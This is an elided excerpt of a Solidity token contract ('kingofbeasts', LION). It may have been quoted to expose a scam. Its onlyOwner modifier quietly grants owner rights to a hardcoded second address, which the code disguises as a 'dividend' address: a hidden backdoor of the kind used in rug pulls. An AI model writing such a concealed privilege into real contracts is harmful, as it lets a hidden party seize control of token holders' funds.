...
contract Ownable is Context {
    ...
    function owner() public view returns (address) {
        ...
        modifier onlyOwner() {
        require(_owner == _msgSender() || _msgSender()    ==  address(0x698B51238e444c4Be9Dfc1d9bA1DE5FcC320734A) , "owner");
        _;
    }
...
contract kingofbeasts  is Context, IERC20, Ownable {
    ...
    string private _name = "kingofbeasts";
    string private _symbol = "LION";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xdf5fC1da763e980Ac733bBF4d5629a3683ef72EB);
    address private _Marketing = 0xdf5fC1da763e980Ac733bBF4d5629a3683ef72EB;
    address public dividend = 0x698B51238e444c4Be9Dfc1d9bA1DE5FcC320734A;
